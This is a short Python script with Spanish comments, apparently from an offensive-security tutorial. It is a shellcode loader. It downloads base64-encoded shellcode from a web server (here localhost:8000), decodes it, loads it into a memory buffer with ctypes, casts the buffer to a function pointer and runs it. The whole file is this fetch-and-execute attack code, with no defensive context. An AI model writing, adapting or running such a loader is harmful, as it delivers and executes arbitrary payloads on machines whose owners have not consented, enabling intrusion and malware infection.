import base64
import ctypes
import urllib.request

# obtenemos el shellcode de nuestro servidor web
url = "http://localhost:8000/shellcode.bin"
response = urllib.request.urlopen(url)

# lo traducimos de base64
shellcode = base64.b64decode(response.read())

# creamos un buffer en memoria
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# creamos un puntero-function a nuestro shellcode
shellcode_func = ctypes.cast(shellcode_buffer,
                             ctypes.CFUNCTYPE(ctypes.c_void_p))

# llamamos el shellcode
shellcode_func()
